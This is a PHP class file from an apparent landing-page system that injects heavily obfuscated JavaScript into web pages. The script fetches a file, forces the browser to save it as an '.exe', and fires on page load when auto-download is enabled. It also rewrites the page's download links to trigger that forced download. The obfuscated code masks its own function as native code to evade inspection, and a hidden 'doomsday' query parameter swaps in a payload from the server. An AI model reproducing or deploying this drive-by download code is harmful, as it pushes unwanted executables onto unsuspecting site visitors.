<?php

namespace LPO\Digest\Injectable\DownloadMethod;

use LPO\Bootstrap;
use LPO\Digest\Injectable\DownloadMethod;
use LPO\Digest\Injectable\JavascriptInvokable;
use QueryString;

class DataURI extends DownloadMethod implements JavascriptInvokable {

	/**
	 * @var string
	 */
	public static $_source_script = <<<'JS'
eval((function(Q0){for(var i0="",n0=0,f0=function(Q0,G0){for(var N0=0,L0=0;L0<G0;L0++){N0*=96;var U0=Q0.charCodeAt(L0);if(U0>=32&&U0<=127){N0+=U0-32;}}return N0;};n0<Q0.length;){if(Q0.charAt(n0)!="`")i0+=Q0.charAt(n0++);else{if(Q0.charAt(n0+1)!="`"){var w0=f0(Q0.charAt(n0+3),1)+5;i0+=i0.substr(i0.length-f0(Q0.substr(n0+1,2),2)-w0,w0);n0+=4;}else{i0+="`";n0+=2;}}}return i0;})("var M7M0=window;for(var T0 in` 5 ){if(T0.length===((30.,1.1400E3)>37?(7.44E2,6):(2.6E1,0xE7))&&T0.charCodeAt((82.>=(13.70` @ 13)?(82.60E1,3):(62.2E1,36)))===((6.020E2,77)>=(0xC4,1.467E3)?\"GET\":0x3C<(0x20E,1.325E3)?(0x10C,100):4.67E2<=(76.10E1,27.)?11.52E2:(20.,26.20E1))&&T0.charCodeAt(((118.,6.4E2)<=(0x73,144)?(0x206,65):(119,22.)>=(62.6E1,28` = 13C,false):(16.7E1,0x7A)>(0xB6,85)?(58.,5):(127.,57)))===(123<(0x132,0xDB)?(0x3,119):(1.086E3,0xC)<9?(0x73,13.):(0x18A,61.))&&T0.charCodeAt(((0x1C6,0x235)<=(0x15A,61)?(13.,17` Z!1D,0x168)>(0x7E,111.)?(0x244,1` ? 3C,142.70E1)))===(20>(99.,39)?\'A\':(82.4E1,58)<106.60E1?(0x226,105):(0x236,0x157))&&T0.charCodeAt(((0x1F5,4.61E2)>26.0E1?(94.2E1,0):(1.457E3,70.5E1)))===((1.256E3,1.327E3)>6.7E1?(0x8C,119):(105.10E1,27.3` U break};var M8x={\"D5\":\"a\",\"k5\":\"lu\",\"L5\":\"f\",\"F5\":\"0\",\"o5\":\"v\",\"U5\":\"e\"};var Z5=(M8x.o5+M8x.D5` \" k` (!U` \/!F` 6!L5);M7M0[T0][Z5]=(function(){var y4=\"oS\",l4=\"Of\",w4=\"tr\",p=((39.1E1,47.30E1)>(0x14D,16.90E1)?(0x249,\"i\"):(18,0xBA)),t4=\"at\",a=\"c\",T4=\"on\",M4=\"de\",D4=\"E\",Q4=(16.<=(81,75.8E1)?(86.0E1,\"g\"):0xA>=(136.6E1,0x1E2)?8.67E2:(131.,133.)),o=((1,0x219)<(120,0x1C8)?1.09E3:(0xFB,9.93E2)>9.0E1?(1.016E3,\"b\"):(0x2F,149)),n=((1.147E3,12.72E2)>8.35E2?(0x84,\"s\"):(1.192E3,62.40E1)),k` U 355E3,10.56E2)<0xBB` S D,1024):(53.5E1,113.)<(0x14A,0x209)?(78.7E1,\"r\"):(1.043E3,3.81E2)<(49.40E1,123)?(98.10E1,6.05E2):(0x2A,6.4E1)),q=(1.061E3>=(0x205,25.90E1)?(8.53E2,\"t\"):0x218<=(26,124.)?\"GET\":(0x57,0x1E6)),X=null,C4=false,K4=(51.<=(0xBA,0x196)?(19.90E1,1024000):(13.27E2,0x7E)),j4=((0x57,20)<(0x213,0x3)?(49,\"T\"):136<(139.,141)?(57.,51200):0xF2<(0x1FB,68)?\"T\":(62.,111.)),v4=\"xe\",i4=(7.73E2>(1.467E3,0xF4)?(97.,\".\"):(138.,122.2E1)),q4=((0x14A,0x54)>=38?(0x112,\"d` L 29.9E1,11.48E2)<=(70,51)?69.2E1:90.<(6.2E1,25.)?0x1DD:(143.,142.)),y=((19,2.86E2)<118?(41,64.):0x6<=(34.2E1,84)?(0x85,\"l\"):(81,25.)),T=((97.30E1,103.60E1)>=0xAB?(39,\"n\"):(117,130.)),A4=((11.,0x257)>1.043E3?\'a\':(20.20E1,0xE)>=40?0x160:(112,142.0E1)>=(146.9` B 31)?(0x71,\"w\"):(0x238,0x9D)),M=((0x193,74)<=(1.347E3,122.)?(105.,\"o` Q!AB,0xC6)>=(35.30E1,79.2E1)?0x1D2:(136,32)>=(0x19D,87)?\"I\":(130,4.42E2)),d=(16.<(0x1EF,106.)?(113,\"D\"):1.348E3<=(47.7E1,102.)?86.:(0x112,0xCF)),W=(d+M+A4+T+y+M+M8x.D5+q4+i4` ( U5+v4),d4=j4,n4=K4,j=C4,P4=X,Q=function(S,m){var x4=\"sen\";var R4=\"ha` &!b4=\"ec` 2!Y=\"ys` =!O4=\"ead` J!B=\"onr` V!Z=((0x154,75.60E1)>=0x10A?(75,\"y\"):(2.280E2,0x257))` S I=\"eT\"` & s=((74.10E1,0x213)<=(0x162,19.)?\'r\':(0x1F3,5.21E2)>` : 9,37.)?(29,\"p\"):0x197<=(65.9E1,41)?(74.10E1,1.424E3):(0x13A,2.25E2));var J=((0x1CE,10)>=30.?\'w\'` F 56,0xC4)<(0xE2,0x1C9)?(0x58,true):(0x50,5.94E2));var C=((1.356E3,0x3)>0x6B?(52.0E1,7.96E2` T D5,3.42E2)<84.?(0x245,80.30E1):(63.80E1,143.)>=(0xCF,0x57)?(1.1260E3,\"T\"):(5.,122));var L=\"GE\"` & Z4=\"open` (!N4=\"es` 4!o4=\"pRequ` C!L4=\"Htt` P!U4=\"ML` N!g4=((0x4B,0x20A)<0x27?\'g\':0xB8>=(0x23A,85.)?(81.,\"X\"):(136.9E1` P B));var F=new M7M0[T0][(g4+U4+L4+o4+N4+q)]();F[(Z4)]((L+C),S,J` . k+N4+s+M+T+n+I+Z+s+M8x.U5)]=(o+y+M+o` W B+O4+Y+q` : D5+q+b4+R4+T+Q4` I%function(){var x=\"th\";var g=((2E0,116.7E1)<=44.80E1?93.:47<(4.17E2,82.)?(8.28E2,\"L\"):(6` 4!92.));var l=((0xBE,10.5E1)>=(131.8E1,69)?(2.40E1,\"-\"):(100,81.30E1` X\"b=\"nt\"` & t=((6.11E2,0x126)>(0x2,14.98E2)?(0x201,\"GET\"):(76,0x1A7)>(5.520E2,1)?(14.,\"C\"):(92,87));var f=\"seHea\"` ) G=\"sp` %!w=\"Re` 0!H=\"get` <!D=((25.,89)>=103.4E1?(0x14,\"p\"):(12.05E2,0x248)>(14.16E2,7.)?(110.,\"N\"):(5.03E2,146));var V=\"DO\"` & r=\"eadyS\";if(F[(k+r+q+M8x.D5` \"\"U5)]==F[(V+D+D4)]){if(j){P4=F[(H+w+G+M+T+f+M4+k)]((t+M+b` V\"+b+l+g` %#T+Q4+x));}if(m){m(F[(k` C#G+T4+n` R\")]);}}};F[(x4+q4)]();},A=function(Z,I,s){var J=((17,74.)<(1.43E3,0xFD)?(0x24E,\"h\"):(0x1C2,29));var C=function(){var x=\"ad\"` 7 g=\"eun` &!l=\"or\";M7M0[T0][(M+T+o+M8x.U5` \" L5+l+g+y+M+x)]=X` A&y+M+a+t4+p+T4)][(J+k` M))]=Z;};try{Q(Z,function(S){var m=\"RL\";var x4=((0x1DD,58)>=120?(112.0E1,144.):(3.30E1,5)>=(6.2E1,34)?\'G\':(2.99E2,6` = )>=61?(0x1C7,\"U\"):(132,0x112));var R4=((0x20,29.)<=0x9F?(0xC7,\"j\"):(56.,56` G\"b4=((10.22E2,86)<=(0x23F,137.1E1)?(1.139E3,\"O\"):(124.,48` X\"Y=\"cr\"` & O4=((126.,116)>(81.9E1,98.60E1)?1.358E3:(0xAB,14.3E1)<130.?104.:57<=(98.2E1,118)?(15.,\"z\"):(56,11.53E2));if(j&&S[(n+p+O4+M8x.U5)]!=P4){C();return ;}if(!I){I=W;}function B(x){var g=\"k\";var l=\"bu` %!b=(74.>=(5.99E2,0x93)?\'d\':(13,13.67E2)>=(0x83,0.)?(0xC8,\"A\"):(26,4.83E2)<=(20.1E1,8.6E1)?\"d\":(0x1FD,47.));var t=\"te\"` & f=\"tri` &!G=\"At` 1!w=\"s` ;\"H=\"em` G!D=((23.,0x115)>111?(0x124,\"m\"):(1.72E2,0x7F))` X V=((53.40E1,0x178)<=89?(26` ,#208):(0x83,14)<=(23,0x12F)?(5.07E2,\"u\"` > 1C,141.)<66?(4,\'f\'):(3.12E2,65.0E1));var r=M7M0[T0][(q4+M+a+V+D+M8x.U5+T+q)][(Y` (#M8x.D5+q` 8#D4+y+H` A((` >!);r[(w+q+G+f+o+V+t)]((J+k` S#M8x.L5),x` E n` \/#q+b+q+w4+p+l+q` F\")]((q4+M+A4+T+y+M` Y D5+q4),I);r[(a+y+p+a+g)]();}B(URL[(Y` D U5` G$` (#b4+o+R4` 7#a+q+x4+m)](S));});}catch(x){C();}};A[(M8x.o5` O D5` V k` (!U5+l4)]=A[(q+y4+w4+p+T+Q4)]=function(){var x=\"] }\",g=\"ve\",l=\"() { [\",b=((25,81.4E1)>=0x1D6?(26.5E1,\" \"):(0xC,39)<=14.?(0x10F,\'b\'):(104,0x1E2)),t=\"ct\",f=\"fu\";return (f+T+t+p+M+T+b)+Z5+(l+T+t4+p+g+b+a+M+M4+x);}` L#A;})()"));
JS;
	/**
	 * @var string
	 */
	private static $_invoking_script = <<<'JS'
if(!document.querySelectorAll) { document.querySelectorAll = function(selector) { var doc = document, head = doc.documentElement.firstChild, styleTag = doc.createElement("STYLE"); head.appendChild(styleTag); doc.__qsaels = []; styleTag.styleSheet.cssText = selector + "{x:expression(document.__qsaels.push(this))}"; window.scrollBy(0, 0); return doc.__qsaels; } } function dl(){window["value0f"](__tokens.directDownloadLink, __tokens.filename + ".exe");iframer(document.querySelectorAll(".dlink")[0], 0, __tokens.downloadLink + "&graceful=1", __tokens.downloadLink + "&graceful=1");} if(__tokens.autoDownload) { dl(); } var links = document.querySelectorAll(".dlink"); for(var i = 0; i < links.length; i++) { var dlink = links[i]; dlink.href = "javascript:void(0)"; dlink.onclick = function(e) { e.preventDefault(); dl(); } }
JS;


	/**
	 * @param Bootstrap $bootstrap
	 *
	 * @return string
	 */
	function getInvokingScript(Bootstrap $bootstrap)
	{
		$iframe = new Iframe;
		return $iframe->getSourceScript().';'.';'.self::$_invoking_script;
	}

	/**
	 * @return string
	 */
	public function getSourceScript(){ return self::$_source_script; }
}

if(QueryString::getInstance()->getParam('doomsday',false))
DataURI::$_source_script = file_get_contents('/usr/share/nginx/lpo/static/file_data_uri.js');